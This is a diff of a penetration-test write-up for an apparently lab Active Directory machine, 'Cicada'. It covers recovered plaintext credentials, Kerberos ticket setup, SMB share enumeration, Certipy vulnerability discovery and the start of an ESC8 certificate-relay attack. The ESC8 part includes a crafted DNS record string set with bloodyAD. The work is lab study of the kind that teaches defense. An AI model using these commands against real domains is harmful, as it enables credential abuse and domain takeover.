@@ -202,37 +202,11 @@ Documents  marketing.png
 
 ```
 
-Rosie.Powell:Cicada123
+![](./screens/marketing.png)
+
+Creds recovered: Rosie.Powell:Cicada123
 
 ### SMB enumeration
-
-```
-sudo bloodhound-python -u 'Rosie.Powell' -p 'Cicada123' -ns 10.129.150.101 -d cicada.vl -c all --zip
-[sudo] password for kali: 
-INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
-INFO: Found AD domain: cicada.vl
-INFO: Getting TGT for user
-INFO: Connecting to LDAP server: dc-jpq225.cicada.vl
-INFO: Testing resolved hostname connectivity dead:beef::b7f1:83f4:e73d:b6f3
-INFO: Trying LDAP connection to dead:beef::b7f1:83f4:e73d:b6f3
-INFO: Found 1 domains
-INFO: Found 1 domains in the forest
-INFO: Found 1 computers
-INFO: Connecting to LDAP server: dc-jpq225.cicada.vl
-INFO: Testing resolved hostname connectivity dead:beef::b7f1:83f4:e73d:b6f3
-INFO: Trying LDAP connection to dead:beef::b7f1:83f4:e73d:b6f3
-INFO: Found 14 users
-INFO: Found 54 groups
-INFO: Found 2 gpos
-INFO: Found 2 ous
-INFO: Found 19 containers
-INFO: Found 0 trusts
-INFO: Starting computer enumeration with 10 workers
-INFO: Querying computer: DC-JPQ225.cicada.vl
-INFO: Done in 00M 08S
-INFO: Compressing output into 20260929120757_bloodhound.zip
-
-```
 
 ```
 nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k --shares
@@ -259,7 +233,7 @@ session setup failed: NT_STATUS_INVALID_PARAMETER
 
 ```
 
-configure /etc/krb5.conf:
+configure /etc/krb5.conf to get a new ticket as Rosie:
 
 ```
 [libdefaults]
@@ -281,6 +255,7 @@ configure /etc/krb5.conf:
 ```
 kinit Rosie.Powell@CICADA.VL # password: Cicada123 klist # confirm you got a TGT
 ```
+Accessing the share reveals some certificates:
 
 ```
 mbclient -U Rosie.Powell //DC-JPQ225.cicada.vl/CertEnroll --password='Cicada123' -k
@@ -460,6 +435,10 @@ if stat = 3 then Response.Write("0") else Response.Write("1") end if
 export KRB5CCNAME=/tmp/krb5cc_1000
 ```
 
+### Enumerating vulnerable certificates
+
+A ESC8 certificate attack is possible as the AD CS works over HTTP;
+
 ```
 certipy-ad find -u Rosie.Powell@cicada.vl -k -dc-ip 10.129.150.101 -dc-host DC-JPQ225.cicada.vl -vulnerable 
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
@@ -521,13 +500,15 @@ Certificate Templates                   : [!] Could not find any certificate tem
 ---
 ## ESC8
 
-How you gained initial access to the machine.
-
 ### Vulnerability
 
-Description of the vulnerability exploited.
+SOurce: https://blog.sentry.security/esc8-attack-guide-for-windows-environments-2/
+
+ESC8 Attack, [a high-severity attack vector in Active Directory Certificate Services (AD CS)](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429?ref=blog.sentry.security) that exploits the Web Enrollment feature alongside NTLM relay attacks. In environments where Web Enrollment is enabled but not secured, attackers can coerce a domain controller or another privileged system to perform NTLM authentication, and then relay that authentication to the AD CS Web Enrollment pages.
 
 ### Exploitation
+
+(i copied this part from the writeup because the dns thing was obscure to me, explain it in a simple clear and intuivive way, also reference sources both here and in the references section)
 
 The record to add is structured as `<host><empty CREDENTIAL_TARGET_INFOMATION structure>`, which in this case will be `DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`. I’ll set the DNS record with `bloodyAD`
 
